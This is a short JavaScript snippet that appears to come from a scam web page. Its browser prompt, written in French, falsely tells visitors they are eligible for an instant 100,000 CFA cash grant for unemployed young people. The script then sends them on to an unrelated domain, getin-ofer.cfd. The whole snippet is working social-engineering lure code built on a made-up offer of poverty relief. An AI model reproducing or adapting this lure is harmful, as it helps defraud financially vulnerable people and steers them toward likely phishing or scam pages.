var password = '100,000 CFA';

password = prompt(
  'Félicitations, vous êtes éligible à recevoir une subvention en espèces de 100 000 CFA pour l’allègement de la pauvreté des jeunes sans emploi. Cliquez sur OK pour recevoir instantanément.',
  '100,000 CFA'
);

if (password !== '100,000 CFA') {
    location.href = 'https://getin-ofer.cfd/100000-Soutenir-Les-Jeunes.html';
}
